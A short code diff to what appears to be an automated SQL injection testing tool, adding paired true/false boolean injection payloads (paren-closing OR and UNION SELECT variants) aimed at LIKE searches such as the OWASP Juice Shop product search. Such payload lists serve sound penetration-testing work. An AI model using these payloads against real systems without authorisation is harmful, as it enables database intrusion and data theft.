@@ -59,6 +59,11 @@ BOOLEAN_PAIRS = [
     ("1 AND 1=1--", "1 AND 1=2--"),
     ("') OR ('1'='1", "') OR ('1'='2"),
     ("1' OR '1'='1' --", "1' OR '1'='2' --"),
+    # Paren-closing variants for LIKE '%...%' inside ((...)) contexts
+    # (e.g. OWASP Juice Shop product search). true returns rows, false none.
+    ("')) OR (('1'='1", "')) OR (('1'='2"),
+    ("%')) OR (('%'='", "%')) AND (('%'='x"),
+    ("')) UNION SELECT NULL-- -", "')) UNION SELECT NULL WHERE 1=2-- -"),
 ]
 
 # Regex patterns for quick pre-LLM triage
